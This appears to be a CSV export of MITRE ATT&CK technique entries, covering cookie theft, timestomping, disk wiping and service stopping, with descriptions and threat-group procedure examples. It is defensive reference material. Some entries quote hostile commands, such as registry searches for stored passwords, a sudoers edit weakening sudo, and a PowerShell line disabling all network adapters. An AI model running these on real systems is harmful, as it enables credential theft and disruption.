T1539,Steal Web Session Cookie,"An adversary may steal web application or service session cookies and use them to gain access to web applications or Internet services as an authenticated user without needing credentials. Web applications and services often use session cookies as an authentication token after a user has authenticated to a website.  Cookies are often valid for an extended period of time, even if the web application is not actively used. Cookies can be found on disk, in the process memory of the browser, and in network traffic to remote systems. Additionally, other applications on the targets machine might store sensitive authentication cookies in memory (e.g. apps which authenticate to cloud services). Session cookies can be used to bypasses some multi-factor authentication protocols.  There are several examples of malware targeting cookies from web browsers on the local system. Adversaries may also steal cookies by injecting malicious JavaScript content into websites or relying on [User Execution] by tricking victims into running malicious JavaScript in their browser.  There are also open source frameworks such as `Evilginx2` and `Muraena` that can gather session cookies through a malicious proxy (e.g., [Adversary-in-the-Middle] that can be set up by an adversary and used in phishing campaigns.  After an adversary acquires a valid cookie, they can then perform a [Web Session Cookie] technique to login to the corresponding web application.","['[LuminousMoth] has used an unnamed post-exploitation tool to steal cookies from the Chrome browser.', '[Sandworm Team] used information stealer malware to collect browser session cookies.', ""[Grandoreiro] can steal the victim's cookies to use for duplicating the active session from another device."", '[Scattered Spider] retrieves browser cookies via Raccoon Stealer.', '[Evilnum] can steal cookies and session information from browsers.', '[CookieMiner] can steal Google Chrome and Apple Safari browser cookies from the victim’s machine. ', '[QakBot] has the ability to capture web session cookies.', '[EVILNUM] can harvest cookies and upload them to the C2 server.', '[Chaes] has used a script that extracts the web session cookie and sends it to the C2 server. ', '[BLUELIGHT] can harvest cookies from Internet Explorer, Edge, Chrome, and Naver Whale browsers.', 'During the [SolarWinds Compromise] [APT29] stole Chrome browser cookies by copying the Chrome profile directories of targeted users.', '[XCSSET] uses <code>scp</code> to access the <code>~/Library/Cookies/Cookies.binarycookies</code> file.', '[TajMahal] has the ability to steal web session cookies from Internet Explorer, Netscape Navigator, FireFox and RealNetworks applications.', '[APT29] has stolen Chrome browser cookies by copying the Chrome profile directories of targeted users.']",False
T1099,Timestomp,"Adversaries may take actions to hide the deployment of new, or modification of existing files to obfuscate their activities. Timestomping is a technique that modifies the timestamps of a file (the modify, access, create, and change times), often to mimic files that are in the same folder. This is done, for example, on files that have been modified or created by the adversary so that they do not appear conspicuous to forensic investigators or file analysis tools. Timestomping may be used along with file name [Masquerading] to hide malware and tools. ",[],True
T1578,Modify Cloud Compute Infrastructure,"An adversary may attempt to modify a cloud account's compute service infrastructure to evade defenses. A modification to the compute service infrastructure can include the creation, deletion, or modification of one or more components such as compute instances, virtual machines, and snapshots.  Permissions gained from the modification of infrastructure components may bypass restrictions that prevent access to existing infrastructure. Modifying infrastructure components may also allow an adversary to evade detection and remove evidence of their presence.",[],False
T1069,Permission Groups Discovery,"Adversaries may attempt to discover group and permission settings. This information can help adversaries determine which user accounts and groups are available, the membership of users in particular groups, and which users and groups have elevated permissions.  Adversaries may attempt to discover group permission settings in many different ways. This data may provide the adversary with information about the compromised environment that can be used in follow-on activity and targeting.","['[APT41] used <code>net group</code> commands to enumerate various Windows user groups and permissions.', '[IcedID] has the ability to identify Workgroup membership.', '[Carbon] uses the <code>net group</code> command.', 'During the [SolarWinds Compromise] [APT29] used the `Get-ManagementRoleAssignment` PowerShell cmdlet to enumerate Exchange management role assignments through an Exchange Management Shell.', '[TrickBot] can identify the groups the user on a compromised host belongs to.', '[MURKYTOP] has the capability to retrieve information about groups.', '[TA505] has used TinyMet to enumerate members of privileged groups. [TA505] has also run <code>net group /domain</code>.', '[ShimRatReporter] gathered the local privileges for the infected host.', '[APT3] has a tool that can enumerate the permissions associated with Windows groups.', '[Siloscape] checks for Kubernetes node permissions.', ""[FIN13] has enumerated all users and roles from a victim's main treasury system."", '[APT29] used the <code>Get-ManagementRoleAssignment</code> PowerShell cmdlet to enumerate Exchange management role assignments through an Exchange Management Shell.', '[UNC2452] used the <code>Get-ManagementRoleAssignment</code> PowerShell cmdlet to enumerate Exchange management role assignments through an Exchange Management Shell.', '[PUNCHBUGGY] can gather domain and workgroup information.\t']",False
T1114,Email Collection,"Adversaries may target user email to collect sensitive information. Emails may contain sensitive data, including trade secrets or personal information, that can prove valuable to adversaries. Adversaries can collect or forward email from mail servers or clients. ","['[Silent Librarian] has exfiltrated entire mailboxes from compromised accounts.', '[Emotet] has been observed leveraging a module that can scrape email addresses from Outlook.', '[Magic Hound] has compromised email credentials in order to steal sensitive data.', 'Dragonfly leveraged Outlook Web Access.']",False
T1594,Search Victim-Owned Websites,"Adversaries may search websites owned by the victim for information that can be used during targeting. Victim-owned websites may contain a variety of details, including names of departments/divisions, physical locations, and data about key employees such as names, roles, and contact info (ex: [Email Addresses] These sites may also have details highlighting business operations and relationships.  Adversaries may search victim-owned websites to gather actionable information. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information] or [Search Open Technical Databases] establishing operational resources (ex: [Establish Accounts] or [Compromise Accounts] and/or initial access (ex: [Trusted Relationship] or [Phishing]","[""[Silent Librarian] has searched victim's websites to identify the interests and academic areas of targeted individuals and to scrape source code, branding, and organizational contact information for phishing pages."", ""During [Cutting Edge] threat actors peformed reconnaissance of victims' internal websites via proxied connections."", ""[Kimsuky] has searched for information on the target company's website."", '[EXOTIC LILY] has used contact forms on victim websites to generate phishing e-mails.', '[Sandworm Team] has conducted research against potential victim websites as part of its operational planning.']",
T1163,Rc.common,"During the boot process, macOS executes <code>source /etc/rc.common</code>, which is a shell script containing various utility functions. This file also defines routines for processing command-line arguments and for gathering system settings, and is thus recommended to include in the start of Startup Item Scripts . In macOS and OS X, this is now a deprecated technique in favor of launch agents and launch daemons, but is currently still used.  Adversaries can use the rc.common file as a way to hide code for persistence that will execute on each reboot as the root user .",[],True
T1561,Disk Wipe,"Adversaries may wipe or corrupt raw disk data on specific systems or in large numbers in a network to interrupt availability to system and network resources. With direct write access to a disk, adversaries may attempt to overwrite portions of disk data. Adversaries may opt to wipe arbitrary portions of disk data and/or wipe disk structures like the master boot record (MBR). A complete wipe of all disk sectors may be attempted.  To maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware used for wiping disks may have worm-like features to propagate across a network by leveraging additional techniques like [Valid Accounts] [OS Credential Dumping] and [SMB/Windows Admin Shares]  On network devices, adversaries may wipe configuration files and other data from the device using [Network Device CLI] commands such as `erase`.",[],False
T1615,Group Policy Discovery,"Adversaries may gather information on Group Policy settings to identify paths for privilege escalation, security measures applied within a domain, and to discover patterns in domain objects that can be manipulated or used to blend in the environment. Group Policy allows for centralized management of user and computer settings in Active Directory (AD). Group policy objects (GPOs) are containers for group policy settings made up of files stored within a predictable network path `\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\`.  Adversaries may use commands such as <code>gpresult</code> or various publicly available PowerShell functions, such as <code>Get-DomainGPO</code> and <code>Get-DomainGPOLocalGroup</code>, to gather information on Group Policy settings. Adversaries may use this information to shape follow-on behaviors, including determining potential attack paths within the target network as well as opportunities to manipulate Group Policy settings (i.e. [Domain or Tenant Policy Modification] for their benefit.","['[BloodHound] has the ability to collect local admin information via GPO.', '[Turla] surveys a system upon check-in to discover Group Policy details using the <code>gpresult</code> command.', '[Empire] includes various modules for enumerating Group Policy.', '[Emissary] has the capability to execute <code>gpresult</code>.']",False
T1025,Data from Removable Media,"Adversaries may search connected removable media on computers they have compromised to find files of interest. Sensitive data can be collected from any removable media (optical disk drive, USB memory, etc.) connected to the compromised system prior to Exfiltration. Interactive command shells may be in use, and common functionality within [cmd] may be used to gather information.   Some adversaries may also use [Automated Collection] on removable media.","['Once a removable media device is inserted back into the first victim, [USBStealer] collects data from it that was exfiltrated from a second victim.', '[InvisiMole] can collect jpeg files from connected MTP devices.', '[Aria-body] has the ability to collect data from USB devices.', '[Explosive] can scan all .exe files located in the USB drive. ', '[GravityRAT] steals files based on an extension list if a USB drive is connected to the system.', '[Rover] searches for files on attached removable drives based on a predefined list of file extensions every five seconds.', 'A [Gamaredon Group] file stealer has the capability to steal data from newly connected logical volumes on a system, including USB drives.', 'An [APT28] backdoor may collect the entire contents of an inserted USB device.', '[Remsec] has a package that collects documents from any inserted USB sticks.', '[BADNEWS] copies files with certain extensions from USB devices to a predefined directory.', '[Prikormka] contains a module that collects documents with certain extensions from removable media or fixed drives connected via USB.', '[Crutch] can monitor removable drives and exfiltrate files matching a given extension list.', '[Crimson] contains a module to collect data from removable drives.', '[Machete] can find, encrypt, and upload files from fixed and removable drives. ', '[ObliqueRAT] has the ability to extract data from removable devices connected to the endpoint.', '[Turla] RPC backdoors can collect files from USB thumb drives.', '[TajMahal] has the ability to steal written CD images and files of interest from previously connected removable drives when they become available again.', '[FLASHFLOOD] searches for interesting files (either a default or customized set of file extensions) on removable media and copies them to a staging area. The default file types copied would include data copied to the drive by [SPACESHIP]', '[AppleSeed] can find and collect data from removable media devices.', 'The [FunnyDream] FilePakMonitor component has the ability to collect files from removable devices.', '[Ramsay] can collect data from removable media and stage it for exfiltration.\t', '[CosmicDuke] steals user files from removable media with file extensions and keywords that match a predefined list.', '[Machete] had a module in its malware to find, encrypt, and upload files from fixed and removable drives.']",
T1116,Code Signing,"Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with.  However, adversaries are known to use code signing certificates to masquerade malware and tools as legitimate binaries . The certificates used during an operation may be created, forged, or stolen by the adversary.    Code signing to verify software on first run can be used on modern Windows and macOS/OS X systems. It is not used on Linux due to the decentralized nature of the platform.   Code signing certificates may be used to bypass security policies that require signed code to execute on a system.",[],True
T1522,Cloud Instance Metadata API,"Adversaries may attempt to access the Cloud Instance Metadata API to collect credentials and other sensitive data.  Most cloud service providers support a Cloud Instance Metadata API which is a service provided to running virtual instances that allows applications to access information about the running virtual instance. Available information generally includes name, security group, and additional metadata including sensitive data such as credentials and UserData scripts that may contain additional secrets. The Instance Metadata API is provided as a convenience to assist in managing applications and is accessible by anyone who can access the instance.  If adversaries have a presence on the running virtual instance, they may query the Instance Metadata API directly to identify credentials that grant access to additional resources. Additionally, attackers may exploit a Server-Side Request Forgery (SSRF) vulnerability in a public facing web proxy that allows the attacker to gain access to the sensitive information via a request to the Instance Metadata API.  The de facto standard across cloud service providers is to host the Instance Metadata API at <code>http[:]//169.254.169.254</code>. ",[],True
T1093,Process Hollowing,Process hollowing occurs when a process is created in a suspended state then its memory is unmapped and replaced with malicious code. Similar to [Process Injection] execution of the malicious code is masked under a legitimate process and may evade defenses and detection analysis.  ,[],True
T1172,Domain Fronting,"Domain fronting takes advantage of routing schemes in Content Delivery Networks (CDNs) and other services which host multiple domains to obfuscate the intended destination of HTTPS traffic or traffic tunneled through HTTPS.  The technique involves using different domain names in the SNI field of the TLS header and the Host field of the HTTP header. If both domains are served from the same CDN, then the CDN may route to the address specified in the HTTP header after unwrapping the TLS header. A variation of the the technique, ""domainless"" fronting, utilizes a SNI field that is left blank; this may allow the fronting to work even when the CDN attempts to validate that the SNI and HTTP Host fields match (if the blank SNI fields are ignored).  For example, if domain-x and domain-y are customers of the same CDN, it is possible to place domain-x in the TLS header and domain-y in the HTTP header. Traffic will appear to be going to domain-x, however the CDN may route it to domain-y.",[],True
T1178,SID-History Injection,"The Windows security identifier (SID) is a unique value that identifies a user or group account. SIDs are used by Windows security in both security descriptors and access tokens.  An account can hold additional SIDs in the SID-History Active Directory attribute , allowing inter-operable account migration between domains (e.g., all values in SID-History are included in access tokens).  Adversaries may use this mechanism for privilege escalation. With Domain Administrator (or equivalent) rights, harvested or well-known SID values  may be inserted into SID-History to enable impersonation of arbitrary users/groups such as Enterprise Administrators. This manipulation may result in elevated access to local resources and/or access to otherwise inaccessible domains via lateral movement techniques such as [Remote Services] [Windows Admin Shares] or [Windows Remote Management]",[],True
T1547,Boot or Logon Autostart Execution,"Adversaries may configure system settings to automatically execute a program during system boot or logon to maintain persistence or gain higher-level privileges on compromised systems. Operating systems may have mechanisms for automatically running a program on system boot or account logon. These mechanisms may include automatically executing programs that are placed in specially designated directories or are referenced by repositories that store configuration information, such as the Windows Registry. An adversary may achieve the same goal by modifying or extending features of the kernel.  Since some boot or logon autostart programs run with higher privileges, an adversary may leverage these to elevate privileges.","['[xCaon] has added persistence via the Registry key <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\load</code> which causes the malware to run each time any user logs in.', '[Dtrack] RAT makes a persistent target file with auto execution on the host start.', '[Mis-Type] has created registry keys for persistence, including `HKCU\\Software\\bkfouerioyou`, `HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{6afa8072-b2b1-31a8-b5c1-{Unique Identifier}`, and `HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{3BF41072-B2B1-31A8-B5C1-{Unique Identifier}`.', '[BoxCaon] established persistence by setting the <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\load</code> registry key to point to its executable.', '[Misdat] has created registry keys for persistence, including `HKCU\\Software\\dnimtsoleht\\StubPath`, `HKCU\\Software\\snimtsOleht\\StubPath`, `HKCU\\Software\\Backtsaleht\\StubPath`, `HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed. Components\\{3bf41072-b2b1-21c8-b5c1-bd56d32fbda7}`, and `HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{3ef41072-a2f1-21c8-c5c1-70c2c3bc7905}`. ', '[LoudMiner] can automatically launch at startup if the AutoStart option is enabled in the VBoxVmService configuration file.']",False
T1013,Port Monitors,"A port monitor can be set through the   API call to set a DLL to be loaded at startup.  This DLL can be located in <code>C:\Windows\System32</code> and will be loaded by the print spooler service, spoolsv.exe, on boot. The spoolsv.exe process also runs under SYSTEM level permissions.  Alternatively, an arbitrary DLL can be loaded if permissions allow writing a fully-qualified pathname for that DLL to <code>HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors</code>.   The Registry key contains entries for the following:  * Local Port * Standard TCP/IP Port * USB Monitor * WSD Port  Adversaries can use this technique to load malicious code at startup that will persist on system reboot and execute as SYSTEM.","['[APT38] installed a port monitoring tool, MAPMAKER, to print the active TCP connections on the local system.']",True
T1600,Weaken Encryption,"Adversaries may compromise a network device’s encryption capability in order to bypass encryption that would otherwise protect data communications.   Encryption can be used to protect transmitted network traffic to maintain its confidentiality (protect against unauthorized disclosure) and integrity (protect against unauthorized changes). Encryption ciphers are used to convert a plaintext message to ciphertext and can be computationally intensive to decipher without the associated decryption key. Typically, longer keys increase the cost of cryptanalysis, or decryption without the key.  Adversaries can compromise and manipulate devices that perform encryption of network traffic. For example, through behaviors such as [Modify System Image] [Reduce Key Space] and [Disable Crypto Hardware] an adversary can negatively effect and/or eliminate a device’s ability to securely encrypt network traffic. This poses a greater risk of unauthorized disclosure and may help facilitate data manipulation, Credential Access, or Collection efforts. ",[],
T1192,Spearphishing Link,"Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments.   All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging [User Execution] The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place. Adversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly or verify the receipt of an email (i.e. web bugs/web beacons). Links may also direct users to malicious applications  designed to [Steal Application Access Token] like OAuth tokens, in order to gain access to protected applications and information.",[],True
T1489,Service Stop,"Adversaries may stop or disable services on a system to render those services unavailable to legitimate users. Stopping critical services or processes can inhibit or stop response to an incident or aid in the adversary's overall objectives to cause damage to the environment.   Adversaries may accomplish this by disabling individual services of high importance to an organization, such as <code>MSExchangeIS</code>, which will make Exchange content inaccessible . In some cases, adversaries may stop or disable many or all services to render systems unusable. Services or processes may not allow for modification of their data stores while running. Adversaries may stop services or processes in order to conduct [Data Destruction] or [Data Encrypted for Impact] on the data stores of services like Exchange and SQL Server.","['[Clop] can kill several processes and services related to backups and security solutions. ', '[LookBack] can kill processes and delete services.', '[Meteor] can disconnect all network adapters on a compromised host using `powershell -Command ""Get-WmiObject -class Win32_NetworkAdapter | ForEach { If ($.NetEnabled) { $.Disable() } }"" > NUL`.', '[WannaCry] attempts to kill processes associated with Exchange, Microsoft SQL Server, and MySQL to make it possible to encrypt their data stores.', '[Royal] can use `RmShutDown` to kill  applications and services using the resources that are targeted for encryption.', '[Diavol] will terminate services using the Service Control Manager (SCM) API. ', '[Avaddon] looks for and attempts to stop database processes.', '[Olympic Destroyer] uses the API call <code>ChangeServiceConfigW</code> to disable all services on the affected system.', '[Cheerscrypt] has the ability to terminate VM processes on compromised hosts through execution of `esxcli vm process kill`. ', '[Prestige] has attempted to stop the MSSQL Windows service to ensure successful encryption using `C:\\Windows\\System32\\net.exe stop MSSQLSERVER`.', '[Pay2Key] can stop the MS SQL service at the end of the encryption process to release files locked by the service.', '[BlackCat] has the ability to stop VM services on compromised networks.', '[RobbinHood] stops 181 Windows services on the system before beginning the encryption process. ', '[Lazarus Group] has stopped the MSExchangeIS service to render Exchange contents inaccessible to users.', '[Babuk] can stop specific services related to backups.', '[REvil] has the capability to stop services and kill processes.', '[Conti] can stop up to 146 Windows services related to security, backup, database, and email solutions through the use of <code>net stop</code>.', '[Ryuk] has called <code>kill.bat</code> for stopping services, disabling services and killing processes.', '[Cuba] has a hardcoded list of services and processes to terminate.', ""[LAPSUS$] has shut down virtual machines from within a victim's on-premise VMware ESXi infrastructure."", '[MegaCortex] can stop and disable services on the system. ', '[Industroyer] data wiper module writes zeros into the registry keys in <code>SYSTEM\\CurrentControlSet\\Services</code> to render a system inoperable.', '[KillDisk] terminates various processes to get the user to reboot the victim machine.', '[Ragnar Locker] has attempted to stop services associated with business applications and databases to release the lock on files used by these applications so they may be encrypted.', '[SLOTHFULMEDIA] has the capability to stop processes and services.', '[HotCroissant] has the ability to stop services on the infected host.', '[EKANS] stops database, data backup solution, antivirus, and ICS-related processes.', '[AvosLocker] has terminated specific processes before encryption.', '[Wizard Spider] has used taskkill.exe and net.exe to stop backup, catalog, cloud, and other services prior to network encryption.', '[Pysa] can stop services and processes. ', '[HermeticWiper] has the ability to stop the Volume Shadow Copy service.', '[Maze] has stopped SQL services to ensure it can encrypt any database. ', '[Indrik Spider] has used [PsExec] to stop services prior to the execution of ransomware.', '[Netwalker] can terminate system processes and services, some of which relate to backup software.']",False
T1121,Regsvcs/Regasm,Regsvcs and Regasm are Windows command-line utilities that are used to register .NET Component Object Model (COM) assemblies. Both are digitally signed by Microsoft.    Adversaries can use Regsvcs and Regasm to proxy execution of code through a trusted Windows utility. Both utilities may be used to bypass process whitelisting through use of attributes within the binary to specify code that should be run before registration or unregistration: <code>[ComRegisterFunction]</code> or <code>[ComUnregisterFunction]</code> respectively. The code with the registration and unregistration attributes will be executed even if the process is run under insufficient privileges and fails to execute. ,[],True
T1652,Device Driver Discovery,"Adversaries may attempt to enumerate local device drivers on a victim host. Information about device drivers may highlight various insights that shape follow-on behaviors, such as the function/purpose of the host, present security tools (i.e. [Security Software Discovery] or other defenses (e.g., [Virtualization/Sandbox Evasion] as well as potential exploitable vulnerabilities (e.g., [Exploitation for Privilege Escalation]  Many OS utilities may provide information about local device drivers, such as `driverquery.exe` and the `EnumDeviceDrivers()` API function on Windows. Information about device drivers (as well as associated services, i.e., [System Service Discovery] may also be available in the Registry.  On Linux/macOS, device drivers (in the form of kernel modules) may be visible within `/dev` or using utilities such as `lsmod` and `modinfo`.","['[HOPLIGHT] can enumerate device drivers located in the registry at `HKLM\\Software\\WBEM\\WDM`.', '[Remsec] has a plugin to detect active drivers of some security products.']",False
T1206,Sudo Caching,"The <code>sudo</code> command ""allows a system administrator to delegate authority to give certain users (or groups of users) the ability to run some (or all) commands as root or another user while providing an audit trail of the commands and their arguments.""  Since sudo was made for the system administrator, it has some useful configuration features such as a <code>timestamp_timeout</code> that is the amount of time in minutes between instances of <code>sudo</code> before it will re-prompt for a password. This is because <code>sudo</code> has the ability to cache credentials for a period of time. Sudo creates (or touches) a file at <code>/var/db/sudo</code> with a timestamp of when sudo was last run to determine this timeout. Additionally, there is a <code>tty_tickets</code> variable that treats each new tty (terminal session) in isolation. This means that, for example, the sudo timeout of one tty will not affect another tty (you will have to type the password again).  Adversaries can abuse poor configurations of this to escalate privileges without needing the user's password. <code>/var/db/sudo</code>'s timestamp can be monitored to see if it falls within the <code>timestamp_timeout</code> range. If it does, then malware can execute sudo commands without needing to supply the user's password. When <code>tty_tickets</code> is disabled, adversaries can do this from any tty for that user.   The OSX Proton Malware has disabled <code>tty_tickets</code> to potentially make scripting easier by issuing <code>echo \'Defaults !tty_tickets\' >> /etc/sudoers</code>  . In order for this change to be reflected, the Proton malware also must issue <code>killall Terminal</code>. As of macOS Sierra, the sudoers file has <code>tty_tickets</code> enabled by default.",[],True
T1564,Hide Artifacts,"Adversaries may attempt to hide artifacts associated with their behaviors to evade detection. Operating systems may have features to hide various artifacts, such as important system files and administrative task execution, to avoid disrupting user work environments and prevent users from changing files or features on the system. Adversaries may abuse these features to hide artifacts such as files, directories, user accounts, or other system activity to evade detection.  Adversaries may also attempt to hide artifacts associated with malicious behavior by creating computing regions that are isolated from common security instrumentation, such as through the use of virtualization technology.","['[OSX/Shlayer] has used the <code>mktemp</code> utility to make random and unique filenames for payloads, such as <code>export tmpDir=""$(mktemp -d /tmp/XXXXXXXXXXXX)""</code> or <code>mktemp -t Installer</code>.', '[Bundlore] uses the <code>mktemp</code> utility to make unique file and directory names for payloads, such as <code>TMP_DIR=`mktemp -d -t x</code>.', ""[WarzoneRAT] can masquerade the Process Environment Block on a compromised host to hide it's attempts to elevate privileges through `IFileOperation`."", '[DarkTortilla] has used `%HiddenReg%` and `%HiddenKey%` as part of its persistence via the Windows registry.', '[Tarrask] is able to create “hidden” scheduled tasks by deleting the Security Descriptor (`SD`) registry value.']",False
T1063,Security Software Discovery,"Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on the system. This may include things such as local firewall rules and anti-virus. Adversaries may use the information from [Security Software Discovery] during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.   ### Windows  Example commands that can be used to obtain security software information are [netsh] <code>reg query</code> with [Reg] <code>dir</code> with [cmd] and [Tasklist] but other indicators of discovery behavior may be more specific to the type of software or security system the adversary is looking for.  ### Mac  It's becoming more common to see macOS malware perform checks for LittleSnitch and KnockKnock software.","['[FinFisher] probes the system to check for antimalware processes.', '[Exaramel] checks for anti-virus software installed on the victim’s machine.', '[yty] checks for ant-sandboxing software such as virtual PC, sandboxie, and VMware.', ""[OopsIE] performs several anti-VM and sandbox checks on the victim's machine.""]",True
T1080,Taint Shared Content," Adversaries may deliver payloads to remote systems by adding content to shared storage locations, such as network drives or internal code repositories. Content stored on network drives or in other shared locations may be tainted by adding malicious programs, scripts, or exploit code to otherwise valid files. Once a user opens the shared tainted content, the malicious portion can be executed to run the adversary's code on a remote system. Adversaries may use tainted shared content to move laterally.  A directory share pivot is a variation on this technique that uses several other techniques to propagate malware when users access a shared network directory. It uses [Shortcut Modification] of directory .LNK files that use [Masquerading] to look like the real directories, which are hidden through [Hidden Files and Directories] The malicious .LNK-based directories have an embedded command that executes the hidden malware file in the directory and then opens the real intended directory so that the user's expected action still occurs. When used with frequently used network directories, the technique may result in frequent reinfections and broad access to systems and potentially to new and higher privileged accounts.   Adversaries may also compromise shared network directories through binary infections by appending or prepending its code to the healthy binary on the shared network directory. The malware may modify the original entry point (OEP) of the healthy binary to ensure that it is executed before the legitimate code. The infection could continue to spread via the newly infected file when it is executed by a remote system. These infections may target both binary and non-binary formats that end with extensions including, but not limited to, .EXE, .DLL, .SCR, .BAT, and/or .VBS.","['[H1N1] has functionality to copy itself to network shares.', '[Darkhotel] used a virus that propagates by infecting executables stored on shared drives.', '[Ramsay] can spread itself by infecting other portable executable files on networks shared drives.\t', '[Gamaredon Group] has injected malicious macros into all Word and Excel documents on mapped network drives.', '[BRONZE BUTLER] has placed malware on file shares and given it the same name as legitimate documents on the share.', '[InvisiMole] can replace legitimate software or documents in the compromised network with their trojanized versions, in an attempt to propagate itself within the network.', '[Cinnamon Tempest] has deployed ransomware from a batch file in a network share.', '[Conti] can spread itself by infecting other remote machines via network shared drives. ', '[Miner-C] copies itself into the public folder of Network Attached Storage (NAS) devices and infects new victims who open the file.', '[Stuxnet] infects remote servers via network shares and by infecting WinCC database views with malicious code.', '[Ursnif] has copied itself to and infected files in network drives for propagation.']",False
T1167,Securityd Memory,"In OS X prior to El Capitan, users with root access can read plaintext keychain passwords of logged-in users because Apple’s keychain implementation allows these credentials to be cached so that users are not repeatedly prompted for passwords.   Apple’s securityd utility takes the user’s logon password, encrypts it with PBKDF2, and stores this master key in memory. Apple also uses a set of keys and algorithms to encrypt the user’s password, but once the master key is found, an attacker need only iterate over the other values to unlock the final password.   If an adversary can obtain root access (allowing them to read securityd’s memory), then they can scan through memory to find the correct sequence of keys in relatively few tries to decrypt the user’s logon keychain. This provides the adversary with all the plaintext passwords for users, WiFi, mail, browsers, certificates, secure notes, etc.  ",[],True
T1527,Application Access Token,"Adversaries may use application access tokens to bypass the typical authentication process and access restricted accounts, information, or services on remote systems. These tokens are typically stolen from users and used in lieu of login credentials.  Application access tokens are used to make authorized API requests on behalf of a user and are commonly used as a way to access resources in cloud-based applications and software-as-a-service (SaaS). OAuth is one commonly implemented framework that issues tokens to users for access to systems. These frameworks are used collaboratively to verify the user and determine what actions the user is allowed to perform. Once identity is established, the token allows actions to be authorized, without passing the actual credentials of the user. Therefore, compromise of the token can grant the adversary access to resources of other sites through a malicious application.  For example, with a cloud-based email service once an OAuth access token is granted to a malicious application, it can potentially gain long-term access to features of the user account if a ""refresh"" token enabling background access is awarded. With an OAuth access token an adversary can use the user-granted REST API to perform functions such as email searching and contact enumeration.  Compromised access tokens may be used as an initial step in compromising other services. For example, if a token grants access to a victim’s primary email, the adversary may be able to extend access to all other services which the target subscribes by triggering forgotten password routines. Direct API access through a token negates the effectiveness of a second authentication factor and may be immune to intuitive countermeasures like changing passwords. Access abuse over an API channel can be difficult to detect even from the service provider end, as the access can still align well with a legitimate workflow. ",[],True
T1180,Screensaver,"Screensavers are programs that execute after a configurable time of user inactivity and consist of Portable Executable (PE) files with a .scr file extension. The Windows screensaver application scrnsave.scr is located in <code>C:\Windows\System32\</code>, and <code>C:\Windows\sysWOW64\</code> on 64-bit Windows systems, along with screensavers included with base Windows installations.   The following screensaver settings are stored in the Registry (<code>HKCU\Control Panel\Desktop\</code>) and could be manipulated to achieve persistence:  * <code>SCRNSAVE.exe</code> - set to malicious PE path * <code>ScreenSaveActive</code> - set to '1' to enable the screensaver * <code>ScreenSaverIsSecure</code> - set to '0' to not require a password to unlock * <code>ScreenSaveTimeout</code> - sets user inactivity timeout before screensaver is executed  Adversaries can use screensaver settings to maintain persistence by setting the screensaver to run malware after a certain timeframe of user inactivity. ",[],True
T1165,Startup Items,"Per Apple’s documentation, startup items execute during the final phase of the boot process and contain shell scripts or other executable files along with configuration information used by the system to determine the execution order for all startup items . This is technically a deprecated version (superseded by Launch Daemons), and thus the appropriate folder, <code>/Library/StartupItems</code> isn’t guaranteed to exist on the system by default, but does appear to exist by default on macOS Sierra. A startup item is a directory whose executable and configuration property list (plist), <code>StartupParameters.plist</code>, reside in the top-level directory.   An adversary can create the appropriate folders/files in the StartupItems directory to register their own persistence mechanism . Additionally, since StartupItems run during the bootup phase of macOS, they will run as root. If an adversary is able to modify an existing Startup Item, then they will be able to Privilege Escalate as well.",[],True
T1137,Office Application Startup,"Adversaries may leverage Microsoft Office-based applications for persistence between startups. Microsoft Office is a fairly common application suite on Windows-based operating systems within an enterprise network. There are multiple mechanisms that can be used with Office for persistence when an Office-based application is started; this can include the use of Office Template Macros and add-ins.  A variety of features have been discovered in Outlook that can be abused to obtain persistence, such as Outlook rules, forms, and Home Page. These persistence mechanisms can work within Outlook or be used through Office 365.","[""[APT32] have replaced Microsoft Outlook's VbaProject.OTM file to install a backdoor macro for persistence."", ""[Gamaredon Group] has inserted malicious macros into existing documents, providing persistence when they are reopened. [Gamaredon Group] has loaded the group's previously delivered VBA project by relaunching Microsoft Outlook with the <code>/altvba</code> option, once the Application.Startup event is received."", '[Ruler] can be used to automate the abuse of Outlook Rules, Forms, and Home Pages to establish persistence.']",
T1089,Disabling Security Tools,"Adversaries may disable security tools to avoid possible detection of their tools and activities. This can take the form of killing security software or event logging processes, deleting Registry keys so that tools do not start at run time, or other methods to interfere with security scanning or event reporting.",['Dragonfly disabled the host-based firewall on a victim and globally opened port 3389.'],True
T1487,Disk Structure Wipe,"Adversaries may corrupt or wipe the disk data structures on hard drive necessary to boot systems; targeting specific critical systems as well as a large number of systems in a network to interrupt availability to system and network resources.   Adversaries may attempt to render the system unable to boot by overwriting critical data located in structures such as the master boot record (MBR) or partition table. The data contained in disk structures may include the initial executable code for loading an operating system or the location of the file system partitions on disk. If this information is not present, the computer will not be able to load an operating system during the boot process, leaving the computer unavailable. [Disk Structure Wipe] may be performed in isolation, or along with [Disk Content Wipe] if all sectors of a disk are wiped.  To maximize impact on the target organization, malware designed for destroying disk structures may have worm-like features to propagate across a network by leveraging other techniques like [Valid Accounts] [OS Credential Dumping] and [Windows Admin Shares]",[],True
T1214,Credentials in Registry,The Windows Registry stores configuration information that can be used by the system or other programs. Adversaries may query the Registry looking for credentials and passwords that have been stored for use by other programs or services. Sometimes these credentials are used for automatic logons.  Example commands to find Registry keys related to password information:   * Local Machine Hive: <code>reg query HKLM /f password /t REG_SZ /s</code> * Current User Hive: <code>reg query HKCU /f password /t REG_SZ /s</code>,[],True
